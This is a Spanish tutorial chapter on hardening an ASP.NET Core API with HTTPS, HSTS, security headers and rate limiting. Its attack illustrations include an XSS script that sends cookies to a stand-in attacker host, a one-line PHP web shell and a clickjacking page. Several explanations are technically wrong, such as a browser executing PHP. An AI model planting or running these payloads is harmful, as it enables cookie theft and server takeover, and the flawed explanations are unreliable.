# 27. Seguridad HTTP: HSTS, HTTPS y Security Headers

## Índice

[27. Seguridad HTTP](#27-seguridad-http)
  - [27.1. Por Qué HTTPS es Obligatorio](#271-por-qué-https-es-obligatorio)
  - [27.2. HTTP Strict Transport Security (HSTS)](#272-http-strict-transport-security-hsts)
  - [27.3. Redirección HTTP a HTTPS](#273-redirección-http-a-https)
  - [27.4. Security Headers](#274-security-headers)
  - [27.5. Configuración en Desarrollo vs Producción](#275-configuración-en-desarrollo-vs-producción)
  - [27.6. Implementación en Program.cs](#276-implementación-en-programcs)
  - [27.7. Verificación de Seguridad](#277-verificación-de-seguridad)
  - [27.8. Resumen y Buenas Prácticas](#278-resumen-y-buenas-prácticas)
  - [27.9. Rate Limiting](#279-rate-limiting)

---

## 27.1. Por qué HTTPS es Obligatorio

### El Problema con HTTP

HTTP transmite datos en texto plano, lo que permite que cualquier interceptor lea las comunicaciones. Esto es especialmente peligroso para APIs que manejan información sensible como credenciales, datos personales y tokens de autenticación.

```mermaid
flowchart LR
    subgraph "HTTP (Inseguro)"
        A1["Cliente"] -->|"POST /auth/signin<br/>{email, password}"| A2["Servidor"]
        A2 -->|"Response<br/>{token}"| A1
        A3["Hacker"] -.->|"Interceptar tráfico"| A2
    end
    
    style A3 fill:#e74c3c,color:#fff
    style A1 fill:#3498db,color:#fff
    style A2 fill:#27ae60,color:#fff
```

### Vulnerabilidades Comunes

| Vulnerabilidad | Descripción | Impacto |
|----------------|-------------|---------|
| **Eavesdropping** | Interceptar comunicaciones | Robo de credenciales, tokens JWT |
| **Man-in-the-Middle** | Modificar requests/responses | Inyección de código, manipulación de datos |
| **Session Hijacking** | Robar cookies de sesión | Acceso no autorizado |
| **DNS Spoofing** | Redirigir a sitios falsos | Phishing, robo de credenciales |

### La Solución: HTTPS

HTTPS cifra toda la comunicación entre cliente y servidor usando TLS (Transport Layer Security). Esto garantiza confidencialidad, integridad y autenticidad de los datos transmitidos.

```mermaid
flowchart LR
    subgraph "HTTPS (Seguro)"
        A1["Cliente"] -->|"POST /auth/signin<br/>{email, password}"| A2["Servidor"]
        A2 -->|"Response<br/>{token}"| A1
        A3["Hacker"] -.->|"No puede descifrar"| A2
    end
    
    style A3 fill:#e74c3c,color:#fff,stroke-dasharray: 5 5
    style A1 fill:#3498db,color:#fff
    style A2 fill:#27ae60,color:#fff
```

### Comparación HTTP vs HTTPS

| Aspecto | HTTP | HTTPS |
|---------|------|-------|
| **Cifrado** | Ninguno (texto plano) | TLS 1.3 (AES-256) |
| **Puerto** | 80 | 443 |
| **Certificado** | No requerido | SSL/TLS requerido |
| **SEO** | Penalizado | Beneficiado |
| **Rendimiento** | Rápido | Ligeramente más lento |
| **Seguridad** | Vulnerable | Protegido |

---

## 27.2. HTTP Strict Transport Security (HSTS)

### ¿Qué es HSTS?

HSTS es un mecanismo de seguridad que indica al navegador que solo debe acceder al sitio web mediante HTTPS, rechazando todas las conexiones HTTP. Esto previene ataques de downgrade y cookie hijacking.

### Cómo Funciona HSTS

```mermaid
sequenceDiagram
    participant Cliente
    participant Servidor
    participant Hacker
    
    Cliente->>Servidor: GET https://api.com
    Servidor->>Cliente: 200 OK<br/>Strict-Transport-Security:<br/>max-age=31536000
    Note over Cliente: Guarda en HSTS cache<br/>"api.com requiere HTTPS"
    
    Cliente->>Hacker: Intentando HTTP
    Hacker->>Cliente: Redirigiendo...
    Note over Cliente: Rechaza (HSTS activo)<br/>No permite HTTP
```

### Configuración de HSTS en ASP.NET Core

```csharp
// En Program.cs
if (!app.Environment.IsDevelopment())
{
    app.UseHsts(options =>
    {
        options.MaxAge = TimeSpan.FromDays(365);      // 1 año
        options.IncludeSubDomains = true;              // Incluir subdominios
        options.Preload = true;                        // Permitir preload
    });
}
```

### Parámetros de HSTS

| Parámetro | Descripción | Valor Recomendado |
|-----------|-------------|-------------------|
| **max-age** | Tiempo que el navegador recuerda | 31536000 (1 año) |
| **includeSubDomains** | Aplica a todos los subdominios | true |
| **preload** | Incluir en lista de preload | true |

### Listas de Preload

Los sitios con `preload=true` pueden ser incluidos en las listas de preload de navegadores como Chrome, Firefox y Safari. Esto garantiza que el navegador rechace HTTP incluso en la primera visita.

**Sitios para agregar a preload:**
- https://hstspreload.org/

---

## 27.3. Redirección HTTP a HTTPS

### Redirección 301 (Permanente)

La redirección 301 indica al navegador que el recurso ha sido movido permanentemente de HTTP a HTTPS. Esto preserva el SEO y entrena al navegador para usar HTTPS.

```mermaid
flowchart TD
    A["Request HTTP<br/>http://api.com"] --> B{"¿Esta en HSTS<br/>cache?"}
    B -->|Sí| C["Rechazar request"]
    B -->|No| D["301 Redirect<br/>https://api.com"]
    D --> E["Navegador guarda<br/>HSTS para dominio"]
```

### Implementación en ASP.NET Core

```csharp
// En Program.cs
if (!app.Environment.IsDevelopment())
{
    app.UseHsts();
    app.UseHttpsRedirection();
}
```

### Configuración de Redirección

```csharp
var builder = WebApplication.CreateBuilder(args);

// Configurar opciones de HTTPS redirection
builder.Services.AddHttpsRedirection(options =>
{
    options.RedirectStatusCode = StatusCodes.Status301MovedPermanently;
    options.HttpsPort = 443;  // Puerto HTTPS estándar
});
```

---

## 27.4. Security Headers

### ¿Por Qué Security Headers?

Los security headers añaden capas adicionales de protección contra ataques comunes web. Se envían en cada respuesta HTTP y son procesados por el navegador.

```mermaid
flowchart LR
    subgraph "Request/Response"
        REQ["Request HTTP<br/>GET /api/productos"] --> RESP["Response HTTP 200<br/>Content-Type: application/json<br/>X-Content-Type-Options: nosniff<br/>X-Frame-Options: DENY<br/>..."]
    end
    
    style RESP fill:#27ae60,color:#fff
```

### Security Headers Implementados

| Header | Valor | Protección |
|--------|-------|------------|
| **X-Content-Type-Options** | `nosniff` | Previene MIME sniffing |
| **X-Frame-Options** | `DENY` | Previene clickjacking (iframes) |
| **X-XSS-Protection** | `1; mode=block` | Protege contra XSS legacy |
| **Referrer-Policy** | `strict-origin-when-cross-origin` | Controla información del referrer |
| **Permissions-Policy** | `accelerometer=(), camera=(), ...` | Controla APIs del navegador |

### Implementación del Middleware

```csharp
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;

namespace TiendaApi.Api.Middleware;

public class SecurityHeadersMiddleware(RequestDelegate next)
{
    private readonly RequestDelegate _next = next;

    private static readonly Dictionary<string, string> SecurityHeaders = 
        new(StringComparer.OrdinalIgnoreCase)
    {
        ["X-Content-Type-Options"] = "nosniff",
        ["X-Frame-Options"] = "DENY",
        ["X-XSS-Protection"] = "1; mode=block",
        ["Referrer-Policy"] = "strict-origin-when-cross-origin",
        ["Permissions-Policy"] = "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()"
    };

    public async Task InvokeAsync(HttpContext context)
    {
        foreach (var header in SecurityHeaders)
        {
            context.Response.Headers.TryAdd(header.Key, header.Value);
        }

        await _next(context);
    }
}

public static class SecurityHeadersMiddlewareExtensions
{
    public static IApplicationBuilder UseSecurityHeaders(this IApplicationBuilder app)
    {
        return app.UseMiddleware<SecurityHeadersMiddleware>();
    }
}
```

### 27.4.1. Vulnerabilidades y Ataques Comunes

A continuación se explican las principales vulnerabilidades que los security headers mitigan:

#### HTTP vs HTTPS: El Problema del Texto Plano

**Vulnerabilidad:** HTTP transmite datos en texto plano, permitiendo que cualquier atacante en la red pueda leer, modificar o inyectar información.

```mermaid
flowchart LR
    subgraph "Ataque Man-in-the-Middle"
        Cliente["Usuario"] -->|"POST /auth/signin<br/>{email, password}"| Internet["Internet"]
        Internet -->|"Datos interceptados"| Servidor["Servidor"]
        Hacker["Atacante"] -.->|"Lee todo el tráfico"| Internet
    end
    
    style Hacker fill:#e74c3c,color:#fff
    style Cliente fill:#3498db,color:#fff
    style Servidor fill:#27ae60,color:#fff
```

**Ejemplo de ataque:**
```
// Trafico HTTP capturado (texto plano)
POST /auth/signin HTTP/1.1
Host: api.tienda.com
Content-Type: application/json

{"email":"admin@tienda.com","password":"admin123"}
// El atacante puede leer: admin@tienda.com / admin123
```

**Solución con HTTPS:**
```
// Trafico HTTPS cifrado (AES-256)
POST /auth/signin HTTP/1.1
Host: api.tienda.com
Content-Type: application/json

8a7b3c5d9e2f1a4b6c8d0e2f4a6b8c0d1e2f4a6b8c9d0e1f2a3b4c5d6e7f8a9b
// El atacante ve: caracteres ilegibles, imposible de descifrar sin la clave
```

#### HTTP Strict Transport Security (HSTS)

**Vulnerabilidad:** Un atacante puede realizar un ataque de "downgrade" forzando al usuario a usar HTTP en lugar de HTTPS.

```mermaid
sequenceDiagram
    participant Usuario
    participant Atacante
    participant Servidor
    
    Note over Usuario: Usuario escribe api.tienda.com
    
    Usuario->>Atacante: DNS Request api.tienda.com
    Atacante->>Usuario: IP falsa (atacante)
    Usuario->>Atacante: GET http://api.tienda.com
    Atacante->>Usuario: 200 OK (proxy a HTTP real)
    
    Note over Usuario: PROBLEMA: Todo el tráfico<br/>pasa por el atacante
```

**Ataque de Downgrade:**
1. Usuario intenta acceder a `https://api.tienda.com`
2. Atacante intercepta y redirige a `http://api.tienda.com` (falsa)
3. Usuario cree que está en HTTPS pero está en HTTP
4. Todas las credenciales son robadas

**Solución con HSTS:**
```
// Primera respuesta del servidor (HTTPS)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// El navegador guarda: "api.tienda.com SOLO acepta HTTPS"
// En siguiente visita, el navegador rechaza HTTP directamente
```

#### XSS (Cross-Site Scripting)

**Vulnerabilidad:** Un atacante inyecta código JavaScript malicioso que se ejecuta en el navegador de la victima.

```mermaid
flowchart LR
    subgraph "Ataque XSS"
        Atacante["Atacante"] -->|"Comentario malicioso<br/>\<script\>robCookies()\</script\>"| Servidor["Servidor"]
        Servidor -->|"Guarda en BD"| BD[(Base de Datos)]
        Usuario["Usuario"] -->|"Carga pagina"| Servidor
        Servidor -->|"Muestra comentario<br/>con script injectado"| Usuario
        Usuario -->|"Script ejecuta<br/>roba cookies"| Atacante
    end
    
    style Atacante fill:#e74c3c,color:#fff
    style Usuario fill:#3498db,color:#fff
```

**Ejemplo de ataque XSS:**
```html
<!-- Comentario en un producto -->
<script>
  fetch('https://atacante.com/robar?cookie=' + document.cookie);
</script>

<!-- Cuando otro usuario ve el comentario, sus cookies son robadas -->
```

**Protección con X-XSS-Protection:**
```
X-XSS-Protection: 1; mode=block

// El navegador detecta el script malicioso y lo bloquea
```

#### Clickjacking

**Vulnerabilidad:** El atacante superpone una página legítima con un iframe transparente, engañando al usuario para que haga clic en botones ocultos.

```mermaid
flowchart TD
    subgraph "Ataque Clickjacking"
        subgraph "Pagina del Atacante (visible)"
            A1["Boton 'Jugar'"]
            A2["Video gracioso"]
            style A1 fill:#27ae60,color:#fff
            style A2 fill:#3498db,color:#fff
        end
        
        subgraph "Iframe invisible (superpuesto)"
            B1["Boton 'Eliminar cuenta'"]
            B2["Boton 'Transferir dinero'"]
        end
        
        A1 -->|"Usuario hace clic"| B1
        A2 -->|"Usuario hace clic"| B2
        
        style B1 fill:#e74c3c,color:#fff,stroke-dasharray: 5 5
        style B2 fill:#e74c3c,color:#fff,stroke-dasharray: 5 5
    end
```

**Ejemplo de clickjacking:**
```html
<!-- Pagina del atacante -->
<html>
  <style>
    iframe { position: absolute; opacity: 0; }
    button { position: absolute; top: 100px; }
  </style>
  <iframe src="https://banco.com/transferir?cuenta=atacante&monto=10000"></iframe>
  <button>Gana un premio!</button>
</html>
<!-- El usuario cree hacer clic en el premio, pero en realidad
     hace clic en Transferir del banco -->
```

**Protección con X-Frame-Options:**
```
X-Frame-Options: DENY

// El navegador rechaza mostrar la pagina en un iframe
```

#### MIME Sniffing

**Vulnerabilidad:** El navegador "adivina" el tipo de archivo basándose en su contenido, lo que puede permitir ejecutar código malicioso.

```mermaid
flowchart LR
    subgraph "Ataque MIME Sniffing"
        Atacante["Atacante"] -->|"Archivo malicioso<br/>upload.php con<br/>contenido JPEG"| Servidor["Servidor"]
        Servidor -->|"Guarda como imagen<br/>(parece JPEG)"| BD[(Base de Datos)]
        Usuario["Usuario"] -->|"Descarga archivo<br/>como imagen"| Servidor
        Servidor -->|"Content-Type: image/jpeg<br/>pero el navegador<br/>detecta PHP"| Usuario
        Usuario -->|"Ejecuta el PHP<br/>como código"| Peligro["Codigo<br/>malicioso<br/>ejecutado"]
    end
    
    style Atacante fill:#e74c3c,color:#fff
    style Peligro fill:#e74c3c,color:#fff
```

**Ejemplo de MIME Sniffing:**
```php
// Archivo aparentemente como imagen pero contiene PHP
Content-Type: image/jpeg

<?php
system($_GET['cmd']);  // El navegador lo ejecuta como código PHP
```

**Protección con X-Content-Type-Options:**
```
X-Content-Type-Options: nosniff

// El navegador respeta el Content-Type declarado,
// no "adivina" el tipo de archivo
```

### Comparación: Antes y Después

| Vulnerabilidad | Antes (Sin Headers) | Después (Con Headers) |
|----------------|---------------------|----------------------|
| **HTTP→HTTPS** | Manual, vulnerable a downgrade | Automático, 301 redirect |
| **HSTS** | ❌ Navegador puede usar HTTP | ✅ 365 días, subdominios, preload |
| **XSS** | ❌ Sin protección | ✅ X-XSS-Protection: 1; mode=block |
| **Clickjacking** | ❌ Página puede iframearse | ✅ X-Frame-Options: DENY |
| **MIME Sniffing** | ❌ Navegador adivina tipos | ✅ X-Content-Type-Options: nosniff |

### Explicación de Cada Header

```mermaid
graph TD
    subgraph "Security Headers"
        A["X-Content-Type-Options: nosniff"] --> B["Previene que el navegador<br/>adivine el tipo de archivo"]
        C["X-Frame-Options: DENY"] --> D["Previene que la página<br/>se muestre en un iframe"]
        E["X-XSS-Protection: 1; mode=block"] --> F["Bloquea ataques XSS<br/>(legacy, para navegadores antiguos)"]
        G["Referrer-Policy"] --> H["Controla qué información<br/>se envía al referrer"]
        I["Permissions-Policy"] --> J["Deshabilita APIs sensibles<br/>como cámara, micrófono, etc."]
    end
```

---

## 27.5. Configuración en Desarrollo vs Producción

### Estrategia de Configuración

```mermaid
flowchart TD
    A["¿Entorno de desarrollo?"] -->|Sí| B["HTTP permitido<br/>Sin HSTS<br/>Sin redirect"]
    A -->|No| C["HTTPS obligatorio<br/>HSTS activo (365 días)<br/>Redirect HTTP→HTTPS"]
    
    B --> D["Puerto 5000 (HTTP)"]
    C --> E["Puerto 443 (HTTPS)"]
    
    style B fill:#f39c12,color:#000
    style C fill:#27ae60,color:#fff
```

### Código de Configuración

```csharp
// En Program.cs
var app = builder.Build();
var isDevelopment = app.Environment.IsDevelopment();

app.UseSwaggerUI(isDevelopment);
app.UseGraphiQL();
app.UseGlobalExceptionHandler();

// Security Headers - Siempre activo
app.UseSecurityHeaders();

// HTTPS + HSTS - Solo en producción
if (!isDevelopment)
{
    app.UseHsts();
    app.UseHttpsRedirection();
}
else
{
    // Log informativo para desarrollo
    Log.Information("🔓 Modo desarrollo: HTTP permitido");
}
```

### Comparación de Configuraciones

| Configuración | Desarrollo | Producción |
|---------------|------------|------------|
| **Puerto** | 5000 (HTTP) | 443 (HTTPS) |
| **UseHsts()** | ❌ Desactivado | ✅ Activado |
| **UseHttpsRedirection()** | ❌ Desactivado | ✅ Activado |
| **Security Headers** | ✅ Activos | ✅ Activos |

---

## 27.6. Implementación en Program.cs

### Configuración Completa

```csharp
using Serilog;
using TiendaApi.Api;
using TiendaApi.Api.Data;
using TiendaApi.Api.Data.Seed.Mongo;
using TiendaApi.Api.Infrastructures;
using TiendaApi.Api.Middleware;

// Configuración de Serilog
Log.Logger = SerilogConfig.Configure().CreateLogger();

var builder = WebApplication.CreateBuilder(args);
builder.Host.UseSerilog();

Log.Information("🚀 Inicializando TiendaApi...");

// Servicios
var services = builder.Services;
var configuration = builder.Configuration;
var environment = builder.Environment;

services.AddMvcControllers();
services.AddFluentValidationServices();
services.AddApiVersioningPolicy();
services.AddSwagger();
services.AddCorsPolicy(configuration, environment.IsDevelopment());
services.AddDatabases(configuration);
services.AddAuthentication(configuration);
services.AddRepositories(configuration);
services.AddServices();
services.AddCache(environment);
services.AddEmail(environment);
services.AddStorage();
services.AddWebSockets();
services.AddBackgroundJobs();
services.AddRealtimeSignalR();
services.AddGraphQL(environment);
services.AddAutoMapper();

// Construcción de la aplicación
var app = builder.Build();
var isDevelopment = app.Environment.IsDevelopment();

Log.Information("✅ Aplicación construida");

// Pipeline de middlewares
app.UseSwaggerUI(isDevelopment);
app.UseGraphiQL();
app.UseGlobalExceptionHandler();

// Security Headers - Siempre activo (no afecta funcionalidad)
app.UseSecurityHeaders();

// HTTPS + HSTS - Solo en producción
if (!isDevelopment)
{
    app.UseHsts();
    app.UseHttpsRedirection();
}
else
{
    Log.Information("🔓 Modo desarrollo: HTTP permitido (sin redirección HTTPS)");
}

app.UseCorsPolicy();
app.UseAuthentication();
app.UseAuthorization();
app.UseWebSockets();
app.MapWebSocketEndpoints();
app.MapSignalRHubs();
app.UseStaticFiles();
app.MapControllers();
app.MapGraphQL();

// Inicialización
await app.InitializeDatabaseAsync(isDevelopment);
app.InitializeStorage(isDevelopment);

PrintStartupInfo(isDevelopment, configuration);

// Ejecución
try
{
    app.Run();
}
catch (Exception ex)
{
    Log.Fatal(ex, "💥 La aplicación falló al iniciar");
    throw;
}
finally
{
    Log.CloseAndFlush();
}

/// <summary>
/// Imprime información de inicio con URLs dinámicas
/// </summary>
static void PrintStartupInfo(bool isDevelopment, IConfiguration configuration)
{
    var urls = configuration["ASPNETCORE_URLS"]?.Split(';') 
        ?? new[] { "http://localhost:5000" };
    
    var firstUrl = urls.FirstOrDefault() ?? "http://localhost:5000";
    var protocol = firstUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase) 
        ? "https" : "http";
    var host = firstUrl.Contains("://") 
        ? firstUrl.Split("://")[1].Split(':')[0] 
        : "localhost";
    var port = firstUrl.Contains(':') 
        ? firstUrl.Split(':').Last() 
        : "5000";

    var mode = isDevelopment ? "DESARROLLO" : "PRODUCCION";
    var baseUrl = $"{protocol}://{host}:{port}";

    Log.Information("=================================================================");
    Log.Information("TiendaApi - API REST Educativa");
    Log.Information("=================================================================");
    Log.Information("Documentacion Swagger:  {BaseUrl}/", baseUrl);
    Log.Information("GraphiQL UI:            {BaseUrl}/graphiql", baseUrl);
    Log.Information("=================================================================");
    Log.Information("🚀 Aplicacion iniciada correctamente en {BaseUrl} ({Mode})",
        baseUrl, mode);
    Log.Information("=================================================================");
}
```

---

## 27.7. Verificación de Seguridad

### Verificar Headers con curl

```bash
# Ver headers de respuesta
curl -I https://localhost:5000/api/categorias

# Expected headers:
# HTTP/1.1 200 OK
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Referrer-Policy: strict-origin-when-cross-origin
# Permissions-Policy: accelerometer=(), camera=(), ...
```

### Verificar HSTS en Producción

```bash
# Desde producción
curl -I https://tu-dominio.com/api/categorias

# Verificar header Strict-Transport-Security
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### Herramientas de Verificación

| Herramienta | Uso |
|-------------|-----|
| **curl** | Verificar headers desde línea de comandos |
| **SSL Labs** | https://ssllabs.com/ssltest/ (Análisis completo de SSL/TLS) |
| **securityheaders.com** | Análisis de security headers |
| **Mozilla Observatory** | https://observatory.mozilla.org/ |

### Checklist de Seguridad HTTP

```mermaid
graph TD
    A["Verificación de Seguridad"] --> B["✅ HTTPS activo"]
    A --> C["✅ HSTS configurado"]
    A --> D["✅ Redirect HTTP→HTTPS"]
    A --> E["✅ Security headers presentes"]
    A --> F["✅ Certificados válidos"]
    A --> G["✅ No hay información sensible en headers"]
    
    style A fill:#3498db,color:#fff
    style B fill:#27ae60,color:#fff
    style C fill:#27ae60,color:#fff
    style D fill:#27ae60,color:#fff
    style E fill:#27ae60,color:#fff
    style F fill:#27ae60,color:#fff
    style G fill:#27ae60,color:#fff
```

---

## 27.8. Resumen y Buenas Prácticas

### Configuración Recomendada

```csharp
// Producción
if (!isDevelopment)
{
    app.UseHsts(options =>
    {
        options.MaxAge = TimeSpan.FromDays(365);
        options.IncludeSubDomains = true;
        options.Preload = true;
    });
    app.UseHttpsRedirection();
}

// Desarrollo
else
{
    // HTTP permitido para testing
}

// Siempre activo
app.UseSecurityHeaders();
```

### Buenas Prácticas

| Práctica | Descripción | Prioridad |
|----------|-------------|-----------|
| **Usar HTTPS siempre** | En producción, HTTPS es obligatorio | 🔴 Alta |
| **HSTS con max-age largo** | 31536000 segundos (1 año) mínimo | 🔴 Alta |
| **Incluir subdominios** | Proteger todos los subdominios | 🟡 Media |
| **Security Headers** | Implementar todos los headers básicos | 🔴 Alta |
| **Preload HSTS** | Agregar a listas de preload | 🟡 Media |
| **Certificados válidos** | Usar Let's Encrypt o CA comercial | 🔴 Alta |
| **TLS 1.3** | Usar versión más reciente de TLS | 🔴 Alta |

### Resumen de Headers de Seguridad

```mermaid
graph LR
    subgraph "Response Headers"
        A["HTTP/1.1 200 OK"] --> B["X-Content-Type-Options: nosniff"]
        A --> C["X-Frame-Options: DENY"]
        A --> D["X-XSS-Protection: 1; mode=block"]
        A --> E["Referrer-Policy: strict-origin-when-cross-origin"]
        A --> F["Permissions-Policy: accelerometer=(), ..."]    
        A --> G["Strict-Transport-Security: max-age=31536000"]
    end
    
    style A fill:#3498db,color:#fff
    style B fill:#27ae60,color:#fff
    style C fill:#27ae60,color:#fff
    style D fill:#27ae60,color:#fff
    style E fill:#27ae60,color:#fff
    style F fill:#27ae60,color:#fff
    style G fill:#27ae60,color:#fff
```

## 27.9. Rate Limiting (Protección contra Abuso)

### ¿Qué es Rate Limiting?

Rate Limiting es una técnica de seguridad que limita el número de solicitudes que un cliente puede hacer a una API en un período de tiempo específico. Protege contra ataques de denegación de servicio (DDoS), fuerza bruta y abuso de la API.

```mermaid
flowchart LR
    subgraph "Sin Rate Limiting"
        A1["Atacante"] -->|"1000 req/s"| S["Servidor"]
        S -->|"CPU 100%<br/>Colapso"| S
    end
    
    subgraph "Con Rate Limiting"
        B1["Atacante"] -->|"100 req/15s"| L["Rate Limiter"]
        L -->|"429 Too Many Requests"| B1
        B2["Usuario Normal"] -->|"50 req/15s"| L
        L -->|"200 OK"| B2
    end
    
    style S fill:#e74c3c,color:#fff
    style L fill:#27ae60,color:#fff
```

### Vulnerabilidades que Previene Rate Limiting

| Vulnerabilidad | Descripción | Impacto |
|----------------|-------------|---------|
| **DDoS** | Ataque de denegación de servicio distribuido | API inaccesible |
| **Fuerza Bruta** | Múltiples intentos de login/password | Cuentas comprometidas |
| **Scraping** | Extracción masiva de datos | Robo de información |
| **Abuso de API** | Uso excesivo de recursos | Degradación de rendimiento |

### Tipos de Rate Limiting

```mermaid
graph TD
    A["Rate Limiting"] --> B["IP Based"]
    A --> C["User Based"]
    A --> D["Endpoint Based"]
    A --> E["Global"]
    
    B --> B1["Por direccion IP"]
    C --> C1["Por usuario autenticado"]
    D --> D1["Por endpoint especifico"]
    E --> E1["Para toda la API"]
    
    style A fill:#3498db,color:#fff
    style B fill:#27ae60,color:#fff
    style C fill:#27ae60,color:#fff
    style D fill:#27ae60,color:#fff
    style E fill:#27ae60,color:#fff
```

### Configuración de Rate Limiting en TiendaApi

La API implementa Rate Limiting usando `AspNetCoreRateLimit` con diferentes reglas según el tipo de endpoint:

```csharp
// En Program.cs
services.AddRateLimitingPolicy();

// Middleware
app.UseRateLimiting();
```

### Reglas de Rate Limiting Implementadas

| Endpoint | Limite | Periodo | Razon |
|----------|--------|---------|-------|
| `*` (General) | 100 | 15s | Uso general de la API |
| `*/api/v1/auth/*` | 10 | 1m | Prevenir fuerza bruta en login |
| `POST:*` | 20 | 1m | Limitar escrituras |
| `POST:/graphql` | 200 | 1m | Queries GraphQL flexibles |

### Respuesta cuando se Excede el Limite

```json
{
    "statusCode": 429,
    "message": "Too Many Requests",
    "headers": {
        "X-RateLimit-Limit": "10",
        "X-RateLimit-Remaining": "0",
        "X-RateLimit-Reset": "60",
        "Retry-After": "60"
    }
}
```

### Cabeceras de Rate Limiting

| Cabecera | Descripcion |
|----------|-------------|
| `X-RateLimit-Limit` | Limite maximo de solicitudes |
| `X-RateLimit-Remaining` | Solicitudes restantes |
| `X-RateLimit-Reset` | Tiempo hasta reset (segundos) |
| `Retry-After` | Segundos esperados antes de reintentar |

### Implementacion del Middleware

```csharp
// RateLimitConfig.cs
public static IServiceCollection AddRateLimitingPolicy(this IServiceCollection services)
{
    services.AddMemoryCache();
    services.Configure<RateLimitOptions>(options =>
    {
        options.EnableEndpointRateLimiting = true;
        options.HttpStatusCode = 429;
        options.QuotaExceededMessage = "Demasiadas solicitudes. Por favor, intente mas tarde.";
        
        options.GeneralRules = new List<RateLimitRule>
        {
            new RateLimitRule
            {
                Endpoint = "*",
                Limit = 100,
                Period = "15s"
            },
            new RateLimitRule
            {
                Endpoint = "*/api/v1/auth/*",
                Limit = 10,
                Period = "1m"
            }
        };
    });

    services.AddSingleton<IRateLimitCounterStore, MemoryCacheRateLimitCounterStore>();
    
    return services;
}

public static IApplicationBuilder UseRateLimiting(this IApplicationBuilder app)
{
    app.UseIpRateLimiting();
    return app;
}
```

### Consideraciones de Producción

| Aspecto | Recomendacion |
|---------|---------------|
| **Almacenamiento** | Usar Redis para multiples instancias |
| **Limites estrictos** | Mas restrictivos en endpoints sensibles |
| **Whitelist** | Excluir IPs de monitoring |
| **Logging** | Registrar intentos bloqueados |
| **Escalabilidad** | Usar Redis para granjas de servidores |

### Buenas Practicas de Rate Limiting

| Practica | Descripcion | Prioridad |
|----------|-------------|-----------|
| **Limites por endpoint** | Diferentes limites segun sensibilidad | Alta |
| **Autenticacion estricta** | Limites mas bajos en auth | Alta |
| **Respuestas claras** | 429 con headers informativos | Media |
| **Monitorizacion** | Alertar sobre patrones anomalos | Media |
| **Escalabilidad** | Usar Redis para granjas de servidores | Media |

### Documentos Relacionados

| Documento | Descripción |
|-----------|-------------|
| [12. JWT Authentication](doc/12-jwt-authentication.md) | Autenticación con tokens JWT |
| [13. Autorización Roles](doc/13-autorizacion-roles.md) | Control de acceso basado en roles |
| [23. Docker CI/CD](doc/23-docker-ci-cd.md) | Despliegue en contenedores |
